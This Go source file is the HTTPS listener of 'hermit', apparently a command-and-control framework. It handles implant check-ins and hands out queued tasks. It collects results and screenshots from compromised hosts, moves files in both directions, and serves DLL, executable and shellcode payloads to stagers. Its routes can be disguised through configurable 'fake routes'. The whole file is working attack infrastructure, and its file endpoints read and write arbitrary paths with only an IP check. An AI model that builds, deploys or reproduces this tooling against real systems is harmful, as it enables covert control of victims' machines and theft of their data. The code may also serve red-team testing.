package service

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"

	"github.com/hideckies/hermit/pkg/common/certs"
	"github.com/hideckies/hermit/pkg/common/meta"
	"github.com/hideckies/hermit/pkg/common/stdout"
	"github.com/hideckies/hermit/pkg/common/utils"
	"github.com/hideckies/hermit/pkg/server/agent"
	"github.com/hideckies/hermit/pkg/server/db"
	"github.com/hideckies/hermit/pkg/server/listener"
	"github.com/hideckies/hermit/pkg/server/state"
)

var upgrader = websocket.Upgrader{}

type CheckInData struct {
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Hostname string `json:"hostname"`
	Sleep    uint   `json:"sleep"`
	Jitter   uint   `json:"jitter"`
	KillDate uint   `json:"killDate"`
}

type StagerData struct {
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	Hostname   string `json:"hostname"`
	LoaderType string `json:"loaderType"`
}

func handleImplantCheckIn(lis *listener.Listener, database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		clientIP := ctx.ClientIP()

		// Read JSON data
		jsonBytes, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}
		var checkInData CheckInData
		if err := json.Unmarshal(jsonBytes, &checkInData); err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}

		// Check if the agent already exists on the database.
		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}

		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if ag.Ip == clientIP && ag.OS == checkInData.OS && ag.Arch == checkInData.Arch {
				targetAgent = ag
				break
			}
		}

		if targetAgent == nil {
			// Add new agent to the database
			targetAgent = agent.NewAgent(
				0,
				uuid.NewString(),
				"",
				clientIP,
				checkInData.OS,
				checkInData.Arch,
				checkInData.Hostname,
				lis.Name,
				checkInData.Sleep,
				checkInData.Jitter,
				checkInData.KillDate,
			)
			if err := database.AgentAdd(targetAgent); err != nil {
				ctx.String(http.StatusBadGateway, fmt.Sprint(err))
				return
			}
		} else {
			// Update some items of the agent on the database
			targetAgent.Hostname = checkInData.Hostname
			if err := database.AgentUpdate(targetAgent); err != nil {
				ctx.String(http.StatusBadGateway, fmt.Sprint(err))
				return
			}
		}

		// Make a loot agent directory and '.tasks' file
		err = meta.MakeLootAgentDir(targetAgent.Name, false)
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}
		_, err = meta.MakeTasksFile(targetAgent.Name, false)
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}

		ctx.String(http.StatusOK, "Checkin")
	}
	return gin.HandlerFunc(fn)
}

func handleImplantTaskGet(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		clientIP := ctx.ClientIP()

		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}
		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if ag.Ip == clientIP {
				targetAgent = ag
				break
			}
		}
		if targetAgent == nil {
			ctx.String(http.StatusBadGateway, "agent not found")
			return
		}

		// Get tasks
		tasks, err := meta.ReadTasks(targetAgent.Name, false)
		if err != nil {
			ctx.String(http.StatusBadGateway, "tasks not set")
			return
		}
		if len(tasks) == 0 {
			ctx.String(http.StatusOK, "")
			return
		}
		// Get the first task and remove it from task list
		task := tasks[0]
		err = meta.DeleteTask(targetAgent.Name, task, false)
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}

		ctx.String(http.StatusOK, task)
	}
	return gin.HandlerFunc(fn)
}

func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		clientIP := ctx.ClientIP()

		// Get agent
		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}

		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if ag.Ip == clientIP {
				targetAgent = ag
				break
			}
		}
		if targetAgent == nil {
			ctx.String(http.StatusBadGateway, "agent not found")
			return
		}

		task := ctx.GetHeader("X-Task")

		data, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}

		content := ""
		switch {
		case strings.HasPrefix(task, "download "):
			downloadPath := string(data)
			content = fmt.Sprintf("Saved at %s", downloadPath)
		case strings.HasPrefix(task, "sleep "):
			sleepTimeStr := strings.Split(task, " ")[1]
			sleepTime, err := strconv.ParseUint(sleepTimeStr, 10, 64)
			if err != nil {
				ctx.String(http.StatusBadGateway, fmt.Sprint(err))
				return
			}
			// Update sleep time on the database
			targetAgent.Sleep = uint(sleepTime)
			err = database.AgentUpdate(targetAgent)
			if err != nil {
				ctx.String(http.StatusBadGateway, fmt.Sprint(err))
				return
			}
			content = "The sleep time has been changed."
		case strings.HasPrefix(task, "upload "):
			uploadPath := string(data)
			content = fmt.Sprintf("Uploaded at %s", uploadPath)
		case task == "screenshot":
			// Write an image file for the screenshot.
			imageFile, err := meta.WriteScreenshot(targetAgent.Name, data, false)
			if err != nil {
				ctx.String(http.StatusBadGateway, fmt.Sprint(err))
				return
			}
			content = fmt.Sprintf("Saved at %s", imageFile)
		default:
			content = string(data)
		}

		// Write the task result to a file.
		_, err = meta.WriteTaskResultString(targetAgent.Name, task, content, false)
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}
		ctx.String(http.StatusOK, "OK")
	}
	return gin.HandlerFunc(fn)
}

func handleImplantWebSocket(ctx *gin.Context) {
	stdout.LogSuccess(fmt.Sprintf("Received from %s on WebSocket\n", ctx.ClientIP()))
	w, r := ctx.Writer, ctx.Request
	c, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		stdout.LogInfo(fmt.Sprint(err))
		return
	}
	defer c.Close()
	for {
		mt, message, err := c.ReadMessage()
		if err != nil {
			stdout.LogInfo(fmt.Sprint(err))
			break
		}
		stdout.LogSuccess(fmt.Sprintf("received: %s", message))
		err = c.WriteMessage(mt, message)
		if err != nil {
			stdout.LogFailed(fmt.Sprint(err))
			break
		}
	}
}

func handleDownload(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		clientIP := ctx.ClientIP()
		// Check if the agent exists on the database
		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}
		agentExists := false
		for _, ag := range ags {
			if ag.Ip == clientIP {
				agentExists = true
				break
			}
		}
		if !agentExists {
			ctx.String(http.StatusBadGateway, "You're not an agent.")
			return
		}

		w := ctx.Writer
		header := w.Header()
		header.Set("Transfer-Encoding", "chunked")
		header.Set("Content-Type", "application/octet-stream")

		// Read the request data (file path to download)
		filenameBytes, err := ctx.GetRawData()
		if err != nil {
			w.WriteHeader(http.StatusBadGateway)
			w.(http.Flusher).Flush()
			return
		}
		filename := string(filenameBytes)

		// Prepare the file
		data, err := os.ReadFile(filename)
		if err != nil {
			w.WriteHeader(http.StatusBadGateway)
			w.(http.Flusher).Flush()
			return
		}

		// Send chunked data
		w.WriteHeader(http.StatusOK)
		chunkedData := utils.ChunkData(data)
		for _, c := range chunkedData {
			w.Write(c)
			w.(http.Flusher).Flush()
			time.Sleep(time.Duration(1) * time.Second)
		}
	}
	return gin.HandlerFunc(fn)
}

func handleUpload(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		clientIP := ctx.ClientIP()

		// Get the agent
		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}
		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if ag.Ip == clientIP {
				targetAgent = ag
				break
			}
		}
		if targetAgent == nil {
			ctx.String(http.StatusBadGateway, "Agent not found.")
			return
		}

		// Get the download path
		downloadPath := ctx.GetHeader("X-File")
		// Check if the file already exists
		if _, err := os.Stat(downloadPath); err == nil {
			ctx.String(http.StatusBadGateway, "file already exists.")
			return
		}

		// Read data from the file
		data, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}

		// Save the file
		err = os.WriteFile(downloadPath, data, 0644)
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}

		ctx.String(http.StatusOK, "")
	}
	return gin.HandlerFunc(fn)
}

func handleStagerDownload(lis *listener.Listener) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		w := ctx.Writer
		header := w.Header()
		header.Set("Transfer-Encoding", "chunked")
		header.Set("Content-Type", "application/octet-stream")

		// Read JSON data
		jsonBytes, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}
		var stgData StagerData
		if err := json.Unmarshal(jsonBytes, &stgData); err != nil {
			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
			return
		}

		// Get all payload paths generated under '~/.hermit/server/listeners/<listner>/payloads'.
		payloadPaths, err := meta.GetPayloadPaths(lis.Name, false, false)
		if err != nil {
			w.WriteHeader(http.StatusBadGateway)
			w.(http.Flusher).Flush()
			return
		}

		targetPayloadPath := ""
		for _, payloadPath := range payloadPaths {
			// TODO: more accurate check for file info

			if stgData.OS == "linux" {
				// TODO
				// ...
			}
			if stgData.OS == "windows" {
				if stgData.LoaderType == "dll-loader" {
					// Load a DLL file.
					if strings.HasSuffix(payloadPath, ".dll") {
						targetPayloadPath = payloadPath
						break
					}
				} else if stgData.LoaderType == "exec-loader" {
					// Load an executable file.
					if strings.HasSuffix(payloadPath, ".exe") {
						targetPayloadPath = payloadPath
						break
					}
				} else if stgData.LoaderType == "shellcode-loader" {
					// Load a shellcode (raw) file.
					if stgData.Arch == "amd64" {
						if strings.HasSuffix(payloadPath, ".x64.bin") {
							targetPayloadPath = payloadPath
						}
					} else if stgData.Arch == "i686" {
						if strings.HasSuffix(payloadPath, ".x86.bin") {
							targetPayloadPath = payloadPath
						}
					}
					if strings.HasSuffix(payloadPath, ".bin") {
						targetPayloadPath = payloadPath
						break
					}
				}
			}
		}
		if targetPayloadPath == "" {
			// TODO: If there are not target payloads, set default paylaod.
			// ...
			w.WriteHeader(http.StatusBadGateway)
			w.(http.Flusher).Flush()
			return
		}

		// Read data from the payload.
		data, err := os.ReadFile(targetPayloadPath)
		if err != nil {
			w.WriteHeader(http.StatusBadGateway)
			w.(http.Flusher).Flush()
			return
		}

		// Send chunked data
		w.WriteHeader(http.StatusOK)
		chunkedData := utils.ChunkData(data)
		for _, c := range chunkedData {
			w.Write(c)
			w.(http.Flusher).Flush()
			time.Sleep(time.Duration(1) * time.Second)
		}
	}
	return gin.HandlerFunc(fn)
}

func httpsRoutes(
	router *gin.Engine,
	lis *listener.Listener,
	serverState *state.ServerState,
) {
	fakeRoutes := serverState.Conf.Listener.FakeRoutes

	for _, r := range fakeRoutes["/implant/checkin"] {
		router.POST(r, handleImplantCheckIn(lis, serverState.DB))
	}
	for _, r := range fakeRoutes["/implant/task/get"] {
		router.GET(r, handleImplantTaskGet(serverState.DB))
	}
	for _, r := range fakeRoutes["/implant/task/result"] {
		router.POST(r, handleImplantTaskResult(serverState.DB))
	}
	for _, r := range fakeRoutes["/implant/websocket"] {
		router.GET(r, handleImplantWebSocket)
	}
	for _, r := range fakeRoutes["/download"] {
		router.POST(r, handleDownload(serverState.DB))
	}
	for _, r := range fakeRoutes["/upload"] {
		router.POST(r, handleUpload(serverState.DB))
	}
	for _, r := range fakeRoutes["/stager/download"] {
		router.POST(r, handleStagerDownload(lis))
	}
}

func HttpsStart(
	lis *listener.Listener,
	serverState *state.ServerState,
) error {
	// Get server certificate paths
	serverCertPath, serverKeyPath, err := certs.GetCertificatePath(certs.CATYPE_HTTPS, false, false, lis.Name)
	if err != nil {
		return err
	}

	gin.SetMode(gin.ReleaseMode)
	router := gin.New()
	router.HandleMethodNotAllowed = false
	router.Use(gin.Recovery())

	httpsRoutes(router, lis, serverState)

	srv := &http.Server{
		Addr:    fmt.Sprintf("%s:%d", lis.Addr, lis.Port),
		Handler: router,
	}

	go func() {
		for {
			select {
			case uuid := <-serverState.Job.ChReqListenerQuit:
				if uuid == lis.Uuid {
					if err := srv.Close(); err != nil {
						serverState.Job.ChListenerError <- lis.Uuid
						break
					}
				} else {
					continue
				}
			default:
			}
		}
	}()

	serverState.Job.ChListenerReady <- lis.Uuid

	if err := srv.ListenAndServeTLS(serverCertPath, serverKeyPath); err != nil {
		if err == http.ErrServerClosed {
			serverState.Job.ChListenerQuit <- lis.Uuid
			return nil
		} else {
			return err
		}
	}

	return nil
}
